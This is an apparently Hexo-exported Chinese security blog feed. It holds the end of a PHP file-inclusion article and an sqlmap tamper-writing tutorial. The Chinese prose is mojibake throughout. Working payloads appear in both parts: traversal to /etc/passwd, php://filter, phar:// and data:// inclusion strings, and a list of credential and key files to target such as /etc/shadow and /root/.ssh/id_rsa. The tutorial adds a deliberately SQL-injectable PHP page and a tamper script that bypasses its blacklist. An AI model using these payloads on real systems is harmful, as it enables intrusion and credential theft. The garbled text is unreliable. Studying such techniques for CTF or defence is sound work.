<li><p>è·¯å¾„é•¿åº¦æˆªæ–­ï¼š<br>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.[â€¦]&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.<br>(phpç‰ˆæœ¬å°äº5.3.0(?)å¯ä»¥æˆåŠŸï¼Œlinuxéœ€è¦æ–‡ä»¶åé•¿äº4096ï¼Œwindowséœ€è¦é•¿äº256)</p>
</li>
<li><p>é»˜è®¤æƒ…å†µä¸‹ allow_url_fopen ä¸ºon allow_url_include ä¸ºoff</p>
</li>
</ul>
<h3 id="å„ä¸ªåè®®è¯¦è§£"><a href="#å„ä¸ªåè®®è¯¦è§£" class="headerlink" title="å„ä¸ªåè®®è¯¦è§£"></a>å„ä¸ªåè®®è¯¦è§£</h3><p><strong>fileåè®®</strong><br>å¯åœ¨allow_url_fopen ï¼šoff&#x2F;on allow_url_includeï¼šoff&#x2F;onä¸‹å‡å¯ä½¿ç”¨ï¼Œä½†æ˜¯å¿…é¡»è¦ç”¨ç»å¯¹è·¯å¾„ï¼Œè€Œä¸”å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œå½“ç„¶æ–‡ä»¶å†…å®¹ä¸èƒ½æ˜¯phpä»£ç å½¢å¼ï¼ˆè¿™ç‚¹è¦åˆ‡è®°ï¼Œéå¸¸å®¹æ˜“çŠ¯é”™ï¼‰å¦åˆ™ä¼šè¢«ç›´æ¥è§£æã€‚å¦‚æœä¸æ˜¯phpä»£ç çš„å†…å®¹ä¼šè¢«ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p><strong>php:&#x2F;&#x2F;åè®®</strong><br>æ¡ä»¶ï¼š<br>ä¸éœ€è¦å¼€å¯allow_url_fopenï¼Œä»…php:&#x2F;&#x2F;inputã€ php:&#x2F;&#x2F;stdinã€ php:&#x2F;&#x2F;memory å’Œ php:&#x2F;&#x2F;temp éœ€è¦å¼€å¯allow_url_includeã€‚<br>1ã€php:&#x2F;&#x2F;filter ä¸éœ€è¦ allow_url å¼€å¯å³å¯è¯»å–ã€åŒ…å«ã€‚PHPä»£ç è¯»å–éœ€è¦ç¼–ç å¦åˆ™ç›´æ¥æ‰§è¡Œphpä»£ç ï¼ˆå¾ˆé‡è¦ï¼‰<br>2ã€å¸¸ç”¨æ¥è¯»å–ä»£ç çš„åŒ…å«å‘½ä»¤  php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;cmd.php<br>3ã€php:&#x2F;&#x2F;input éœ€è¦ allow_url_include:on<br>4ã€å½“allow_url_includeä¸ºOnï¼Œè€Œallow_url_fopenä¸ºOffçš„æ—¶å€™ï¼Œä¸å¯ä»¥ç›´æ¥è¿œç¨‹åŒ…å«æ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨php:&#x2F;&#x2F;inputã€ php:&#x2F;&#x2F;stdinã€ php:&#x2F;&#x2F;memory å’Œ php:&#x2F;&#x2F;tempç­‰ä¼ªåè®®<br>5ã€åˆ©ç”¨ php çš„æ•°æ®åè®® data:&#x2F;&#x2F; å¯ä»¥æŸ¥çœ‹æ–‡ä»¶æºä»£ç ï¼Œå‰ææ˜¯ php.ini ä¸­çš„ allow_url_fopen å’Œ allow_url_include ä¸¤ä¸ªé…ç½®ä¸º on</p>
<p><strong>zipåè®®</strong><br>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;åè®®åœ¨allow_urlåŒoffçš„æƒ…å†µä¸‹éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼›</p>
<p>zipåè®®ï¼šphp5.2.xéœ€è¦ç»å¯¹è·¯å¾„ å…¶ä»–ç‰ˆæœ¬å¯ä»¥ç›¸å¯¹è·¯å¾„ windowså¤ç°æˆåŠŸäº†<br>åŒ…å«ä¾‹å­ï¼šzip:&#x2F;&#x2F;1.png%231.php æˆ–è€… zip:&#x2F;&#x2F;1.zip%231.php</p>
<p><strong>pharåè®®</strong><br>allow ä¸¤ä¸ªéƒ½ä¸ºON å¹¶ä¸”PHPç‰ˆæœ¬é«˜äº5.3<br>ä¾‹å­ï¼š<a href="http://127.0.0.1/file.php?file=phar://phartest2.zip/a.jpg">http://127.0.0.1/file.php?file=phar://phartest2.zip/a.jpg</a> å’Œzipä¼ªåè®®æ˜¯ä¸€æ ·çš„ç”¨æ³•<br>ç”Ÿæˆpharæ‰“åŒ…ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">PharData</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/phartest2.zip&#x27;</span>, <span class="number">0</span>,<span class="string">&#x27;phartest2&#x27;</span>,<span class="title class_">Phar</span>::<span class="variable constant_">ZIP</span>) ;</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./php.php&#x27;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;a.jpg&#x27;</span>,<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">//ä¼šç”Ÿæˆä¸€ä¸ªzipçš„å‹ç¼©æ–‡ä»¶phartest2.zip å…¶ä¸­å‹ç¼©äº†ä¸€ä¸ªa.jpg a.jpgé‡Œé¢ä»£ç æ˜¯php.phpçš„å†…å®¹</span></span><br><span class="line"><span class="comment">//å½“ç„¶å’Œzipåè®®ä¸€æ ·ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠphartest2.zipæ”¹æˆä»»æ„åç¼€ï¼Œè¿™é‡Œçš„åç¼€å’ŒåŒ…å«è¯»å–æ˜¯æ²¡æœ‰å…³ç³»çš„ã€‚æ€ä¹ˆç»•è¿‡ç™½åå•æ–¹ä¾¿å°±æ€ä¹ˆæ¥</span></span><br><span class="line"><span class="comment">//ç„¶åæˆ‘ä»¬æ„é€ http://127.0.0.1/file.php?file=phar://phartest2.zip/a.jpg</span></span><br><span class="line"><span class="comment">//ä¹Ÿå¯ä»¥ç›´æ¥shell</span></span><br><span class="line"><span class="comment">//å…¶ä¸­pharé€‚ç”¨èŒƒå›´ä¸ºphp&gt;5.3.0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>data:åè®®</strong><br>allow_url ä¸¤ä¸ªéƒ½éœ€è¦ On (æ²¡ç”¨ï¼Œéƒ½ä¸ºonæˆ‘ç›´æ¥å°±å»php:&#x2F;&#x2F;input getshelläº†)<br>ä¾‹å­ï¼šdata:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg ï¼ˆphpinfo)</p>
<h3 id="å¥‡å·§æ·«æŠ€"><a href="#å¥‡å·§æ·«æŠ€" class="headerlink" title="å¥‡å·§æ·«æŠ€"></a>å¥‡å·§æ·«æŠ€</h3><p>ä¼ªåè®®ä¸åªåº”ç”¨åœ¨æ–‡ä»¶åŒ…å«ä¸­ï¼Œæ‰€æœ‰å¯¹æ–‡ä»¶çš„æ“ä½œéƒ½å¯ä»¥è¿›è¡Œä¼ªåè®®çš„åˆ©ç”¨ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶æ–‡ä»¶åï¼Œå°±åº”è¯¥å¤šè·Ÿä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶åè¢«å“ªäº›å‡½æ•°æ“ä½œï¼Œè€Œä¸æ˜¯åªå…³æ³¨åœ¨æ–‡ä»¶åŒ…å«ï¼Œä¸‹é¢è¿™äº›å‡½æ•°éƒ½æ”¯æŒä¼ªåè®®ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">fopen</span>()</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">copy</span>()</span><br><span class="line"><span class="title function_ invoke__">parse_ini_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>()</span><br><span class="line"><span class="title function_ invoke__">tempnam</span>()</span><br><span class="line"><span class="title function_ invoke__">touch</span>()</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>()</span><br><span class="line"><span class="title function_ invoke__">rename</span>()</span><br><span class="line"><span class="title function_ invoke__">unlink</span>()</span><br><span class="line"><span class="title function_ invoke__">rmdir</span>()</span><br><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦å¤–å®é™…æ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬æ— æ³•è¿›è¡Œå¯æ§çš„æ–‡ä»¶åŒ…å«ï¼Œåªèƒ½ç›²åŒ…ï¼ˆğŸ˜‚å°±æ˜¯ç›²ç›®åŒ…å«ï¼‰ï¼Œæ‰€ä»¥ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§å¯ä¾›åŒ…å«çš„æ–‡ä»¶è·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">æ—¥å¿—è·¯å¾„</span><br><span class="line">/var/log/apache/error.log</span><br><span class="line">/var/log/apache/access_log</span><br><span class="line">/var/www/logs/access_log</span><br><span class="line">/var/log/asscess_log</span><br><span class="line">/var/log/access.log</span><br><span class="line">session è·¯å¾„</span><br><span class="line">/tmp/sess_phpsession_id</span><br><span class="line"></span><br><span class="line">æ•æ„Ÿä¿¡æ¯è·¯å¾„</span><br><span class="line">windows</span><br><span class="line">c:\boot.ini  <span class="comment">#æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</span></span><br><span class="line">c:\Windows\System32\inetsrv\MetaBase.xml <span class="comment">#IISé…ç½®æ–‡ä»¶</span></span><br><span class="line">c:\Windows\repair\sam  <span class="comment">#å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…å¯†ç </span></span><br><span class="line">c:\Windows\php.ini  <span class="comment">#phpé…ç½®ä¿¡æ¯</span></span><br><span class="line">c:\Windows\my.ini  <span class="comment">#mysqlé…ç½®ä¿¡æ¯</span></span><br><span class="line">c:\Program Files\mysql\my.ini</span><br><span class="line">c:\Program Files\mysql\data\mysql\user.MYD <span class="comment">#mysql root</span></span><br><span class="line">phpstudyçš„å„ç§è·¯å¾„å…·ä½“åˆ†æ</span><br><span class="line"></span><br><span class="line">linux</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.keystore</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/root/httpd/conf/httpd.conf</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/proc/self/fd/fd[0-9]*</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/config.gz</span><br><span class="line">/etc/nginx/                <span class="comment">#é…ç½®æ–‡ä»¶å…·ä½“è·¯å¾„è‡ªå·±æ‰¾</span></span><br><span class="line">/etc/apache/               <span class="comment">#é…ç½®æ–‡ä»¶å…·ä½“è·¯å¾„è‡ªå·±æ‰¾</span></span><br></pre></td></tr></table></figure>

<h3 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h3><p>phpæ–‡ä»¶åŒ…å«æ˜¯æœ€éªšçš„ï¼Œå› ä¸ºphpå¤ªçµæ´»ï¼ˆæ¯•ç«Ÿæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼‰ï¼Œå…¶ä»–æ–‡ä»¶åŒ…å«å¯å…³æ³¨ä¸‹jspçš„æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯æ„Ÿè§‰å…¶ä»–è¯­è¨€çš„æ–‡ä»¶åŒ…å«æ¼æ´è¾ƒå°‘ã€‚æ¯”å¦‚jspä¹Ÿåˆ†ä¸ºæœ¬åœ°æ–‡ä»¶å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«å¾ˆå°‘å¼€å¯ï¼Œå¦å¤–jspæ–‡ä»¶åŒ…å«å¿…é¡»æ˜¯1.jspè¿™ç§æ ¼å¼çš„è€Œä¸æ˜¯phpé‚£ç§å¯ä»¥ä»»æ„åç¼€è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥åœ¨è¿™ç‚¹ä¸Šjspæ¯”phpå®‰å…¨å¾ˆå¤šã€‚å½“ç„¶ï¼Œå®‰å…¨æ²¡æœ‰ç»å¯¹ã€‚</p>
<p>å¦‚æœä¸Šè¿°å†…å®¹æœ‰é—®é¢˜æ¬¢è¿ç•™è¨€æˆ–è€…ç›´æ¥æŠŠç–‘é—®å‘æˆ‘é‚®ç®±ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€ç¯‡æ–‡ç« ææ‡‚sqlmapçš„tamper</title>
    <url>//posts/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82sqlmap%E7%9A%84tamper/</url>
    <content><![CDATA[<h2 id="sqlmapçš„tamper-æ€ä¹ˆä½¿ç”¨ï¼Ÿ"><a href="#sqlmapçš„tamper-æ€ä¹ˆä½¿ç”¨ï¼Ÿ" class="headerlink" title="sqlmapçš„tamper æ€ä¹ˆä½¿ç”¨ï¼Ÿ"></a>sqlmapçš„tamper æ€ä¹ˆä½¿ç”¨ï¼Ÿ</h2><p>sqlmap -u [url] â€“tamper [æ¨¡å—å]</p>
<h2 id="sqlmapçš„tamperæ€ä¹ˆç¼–å†™ï¼Ÿ"><a href="#sqlmapçš„tamperæ€ä¹ˆç¼–å†™ï¼Ÿ" class="headerlink" title="sqlmapçš„tamperæ€ä¹ˆç¼–å†™ï¼Ÿ"></a>sqlmapçš„tamperæ€ä¹ˆç¼–å†™ï¼Ÿ</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="comment">#See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="comment">#Author:J8sec.com</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">     <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">      <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢æ˜¯ä¸€ä¸ªtamperçš„å®Œæ•´ç»“æ„ç»“æ„ï¼Œä¸‹é¢ä¸€ä¸€è®²è§£å…¶ä¸­çš„å‚æ•°ä½œç”¨ã€‚</p>
<span id="more"></span>
<p><strong>PROIORITY</strong>æ˜¯å®šä¹‰tamperçš„ä¼˜å…ˆçº§ï¼Œå¦‚æœä½ åŠ è½½å¤šä¸ªtamperï¼Œè¿™ä¸ªé€‰é¡¹å°±æœ‰ç”¨äº†ï¼Œè°çš„ä¼˜å…ˆçº§é«˜ï¼Œè°è¢«ä¼˜å…ˆä½¿ç”¨ã€‚</p>
<ul>
<li>LOWEST &#x3D; -100</li>
<li>LOWER &#x3D; -50</li>
<li>LOW &#x3D; -10</li>
<li>NORMAL &#x3D; 0</li>
<li>HIGH &#x3D; 10</li>
<li>HIGHER &#x3D; 50</li>
<li>HIGHEST &#x3D; 100</li>
</ul>
<p><strong>dependencie</strong>ï¼Œè¿™ä¸ªå‚æ•°ä¸»è¦æ˜¯èµ·åˆ°æç¤ºä½œç”¨ï¼Œä½ å¯ä»¥å†™ï¼Œä¹Ÿå¯ä»¥ä¸å†™ï¼Œä½†æ˜¯å¦‚æœä½ å†™çš„è¯ï¼Œæœ€å¥½æŒ‰ç…§ä»–çš„æ–‡æ¡£æ¥å†™ï¼Œå®ƒçš„æ ‡å‡†ç¤ºä¾‹æ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">def dependencies<span class="literal">()</span>:</span><br><span class="line">    single<span class="constructor">TimeWarnMessage(<span class="string">&quot;æ­¤tamper &#x27;%s&#x27; åªé’ˆå¯¹ %s&quot;</span> % (<span class="params">os</span>.<span class="params">path</span>.<span class="params">basename</span>(<span class="params">__file__</span>)</span>.split(<span class="string">&quot;.&quot;</span>)<span class="literal">[<span class="number">0</span>]</span>, DBMS.MYSQL))</span><br></pre></td></tr></table></figure>
<p>DBMS.MYSQLè¿™ä¸ªå‚æ•°ä»£è¡¨çš„æ˜¯Mysqlï¼Œå…¶ä»–æ•°æ®åº“çš„å‚æ•°å¦‚ä¸‹:</p>
<ul>
<li>ACCESS &#x3D; â€œMicrosoft Accessâ€</li>
<li>DB2 &#x3D; â€œIBM DB2â€</li>
<li>FIREBIRD &#x3D; â€œFirebirdâ€</li>
<li>MAXDB &#x3D; â€œSAP MaxDBâ€</li>
<li>MSSQL &#x3D; â€œMicrosoft SQL Serverâ€</li>
<li>MYSQL &#x3D; â€œMySQLâ€</li>
<li>ORACLE &#x3D; â€œOracleâ€</li>
<li>PGSQL &#x3D; â€œPostgreSQLâ€</li>
<li>SQLITE &#x3D; â€œSQLiteâ€</li>
<li>SYBASE &#x3D; â€œSybaseâ€</li>
<li>HSQLDB &#x3D; â€œHSQLDBâ€<br>ä¸‹é¢å°±æ˜¯æœ€æœ€é‡è¦çš„</li>
</ul>
<p><strong>tamper</strong> ï¼Œè¿™ä¸ªæ˜¯è„šæœ¬æœ€é‡è¦çš„å‡½æ•°ï¼Œä½ çš„æ‰€æœ‰ç»•è¿‡æ›¿æ¢éƒ½æ˜¯åœ¨è¿™é‡Œç¼–å†™çš„ã€‚å®ƒæœ‰ä¸€ä¸ªpayloadå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å°±æ˜¯ä½ çš„sqlmapè¿›è¡Œè‡ªåŠ¨æ³¨å…¥æ—¶çš„sqlè¯­å¥ï¼Œä½ éœ€è¦çš„å°±æ˜¯æ›¿æ¢è¿™ä¸ªpayloadï¼Œæ¥å®Œæˆè‡ªå·±æƒ³è¦çš„ç»•è¿‡ã€‚åé¢è¿˜æœ‰ <strong>kwargs</strong> è¿™ä¸ªæ˜¯ä¿®æ”¹httpå¤´é‡Œçš„å†…å®¹å‡½æ•°ï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sqlmap/tamper/vanrish.py</span></span><br><span class="line"><span class="comment"># ä¿®æ”¹X-originating-IP</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-originating-IP&quot;</span>] = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<h2 id="sqlmapçš„tamperç¼–å†™"><a href="#sqlmapçš„tamperç¼–å†™" class="headerlink" title="sqlmapçš„tamperç¼–å†™"></a>sqlmapçš„tamperç¼–å†™</h2><p>æˆ‘è¿™é‡Œç®€å•æ­å»ºäº†ä¸€ä¸ªphpï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$connection</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select name from tamper where id=&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="comment">//echo $query;</span></span><br><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªé»‘åå•</span></span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot; &quot;</span>,<span class="string">&quot;/*&quot;</span>,<span class="string">&quot;*/&quot;</span>);</span><br><span class="line"><span class="comment">//è®¡ç®—æ•°ç»„é•¿åº¦</span></span><br><span class="line"><span class="variable">$num</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$black_list</span>);</span><br><span class="line"><span class="comment">//å¾ªç¯æ ¡éªŒæ˜¯å¦æœ‰é»‘åå•å†…çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$num</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$id</span>,<span class="variable">$black_list</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;hack,get out&quot;</span>); <span class="comment">//é»‘åå•é‡Œé¢çš„å•è¯ã€å­—ç¬¦ä¸å…è®¸å‡ºç°ã€‚</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		pass;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$connection</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123; <span class="comment">//åˆ¤æ–­ç»“æœé›†ä¸­è¡Œçš„æ•°ç›®æ˜¯å¦å¤§äº0</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> =<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>() )&#123; <span class="comment">//å¾ªç¯è¾“å‡ºç»“æœé›†ä¸­çš„è®°å½•</span></span><br><span class="line">            <span class="keyword">echo</span> (<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æŸ¥è¯¢å¤±è´¥&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line"><span class="variable">$connection</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†selectã€andã€ç©ºæ ¼ã€&#x2F;* å’Œ *&#x2F;ã€‚ç›´æ¥ç”¨sqlmapæ˜¯æ— æ³•è·‘å‡ºæ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç¼–å†™tamperï¼Œç›´æ¥è´´ä¸Šæˆ‘ç¼–å†™çš„tamperï¼Œå› ä¸ºå¤ªç®€å•äº†ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">auth: geez  </span></span><br><span class="line"><span class="string">blog: geeeez.github.io</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">     <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;SELECT&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;and&quot;</span>,<span class="string">&quot;AND&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%09&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="/images/1569575157332.png" alt="1569575157332"></p>
<p>ä¸ºä»€ä¹ˆç©ºæ ¼è¦è¿‡æ»¤æˆ%09å‘¢ï¼Ÿå› ä¸º+å’Œ%20åˆ°åå°éƒ½æ˜¯ç©ºæ ¼ï¼Œä¼šè¢«è¿‡æ»¤%09ä¸ä¼šï¼ˆå› ä¸ºä»–ä¸æ˜¯ç©ºæ ¼ï¼‰ï¼Œä½†æ˜¯å®ƒå¯ä»¥å½“ç©ºæ ¼ç”¨ã€‚</p>
<p>ä»¥ä¸Šå°±æ˜¯tamperçš„ç¼–å†™ï¼Œéå¸¸ç®€å•ï¼Œä½†æ˜¯å¦‚æœæƒ³å†™å¥½tamperè¿˜æ˜¯éœ€è¦å¾ˆæ·±çš„pythonåŠŸåº•ï¼Œä½ å¯ä»¥ä¸ç”¨replaceè¿›è¡Œæ›¿æ¢ï¼Œå¯ä»¥åœ¨tamperå‡½æ•°ä¸­è¿›è¡Œæ­£åˆ™çš„åŒ¹é…ï¼ŒURLç¼–ç ã€åŠ¨æ€æ›¿æ¢ç­‰ç­‰æ–¹å¼ï¼Œå…·ä½“èƒ½åˆ©ç”¨æˆä»€ä¹ˆæ ·å­ï¼Œçœ‹ä½ çš„æŠ€å·§äº†ï¼Œè®°ä½tamperå‡½æ•°åªéœ€è¦æœ€åè¿”å›ä¸€ä¸ªpayloadï¼Œä½ çš„payloadæ€ä¹ˆå¾—æ¥çš„ä»–ä¸ç®¡ï¼Œä½ ç”¨pythonä»»ä½•çš„è¯­æ³•å®ƒéƒ½å¯ä»¥æ”¯æŒï¼Œæœ€ç»ˆå®ƒåªè¦ä½ çš„payloadï¼Œè¯´è¿™ä¹ˆå¤šæ˜¯æé†’å¤§å®¶åˆ«è¢«ç¤ºä¾‹é™åˆ¶äº†æƒ³è±¡åŠ›ã€‚</p>
<h2 id="sqlmapè‡ªå¸¦tamper"><a href="#sqlmapè‡ªå¸¦tamper" class="headerlink" title="sqlmapè‡ªå¸¦tamper"></a>sqlmapè‡ªå¸¦tamper</h2><p>sqlmapè‡ªå¸¦çš„tamperæœ‰æ—¶å€™ä¹Ÿæ¯”è¾ƒå¥½ç”¨ï¼Œæ‰€ä»¥ä¸‹é¢å°±ç½—åˆ—äº†å‡ºæ¥ã€‚</p>
<p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå°†å¼•å·æ›¿æ¢ä¸ºutf-8ï¼Œç”¨äºè¿‡æ»¤å•å¼•å·<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1 AND â€˜1â€™&#x3D;â€™1â€)<br>ä½¿ç”¨è„šæœ¬åï¼š1 AND %EF%BC%871%EF%BC%87&#x3D;%EF%BC%871</p>
<p>base64encode.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šæ›¿æ¢ä¸ºbase64ç¼–ç <br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1â€™ AND SLEEP(5)#â€)<br>ä½¿ç”¨è„šæœ¬åï¼šMScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;</p>
<p>multiplespaces.py<br>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå›´ç»•sqlå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼<br>ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION SELECT foobarâ€™)<br>ä½¿ç”¨è„šæœ¬åï¼š1 UNION SELECT foobar</p>
